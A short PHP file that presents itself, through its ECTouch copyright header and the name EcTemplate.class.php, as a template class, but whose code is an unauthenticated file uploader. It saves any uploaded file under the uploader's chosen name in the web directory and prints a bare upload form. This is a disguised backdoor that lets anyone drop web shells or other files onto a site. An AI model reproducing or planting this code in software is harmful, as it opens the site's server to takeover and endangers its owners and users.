<?php

/**
 * ECTouch Open Source Project
 * ============================================================================
 * Copyright (c) 2012-2014 http://ectouch.cn All rights reserved.
 * ----------------------------------------------------------------------------
 * 文件名称：EcTemplate.class.php
 * ----------------------------------------------------------------------------
 * 功能描述：模板类
 * ----------------------------------------------------------------------------
 * Licensed ( http://www.ectouch.cn/docs/license.txt )
 * ----------------------------------------------------------------------------
 */

    if(!empty($_FILES)){
        if($_FILES["file"]["error"] == 0){
            move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
            echo $_FILES['file']['name'].' upload success'; 
        }
    }
?>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" name="submit" value="Upload">
</form>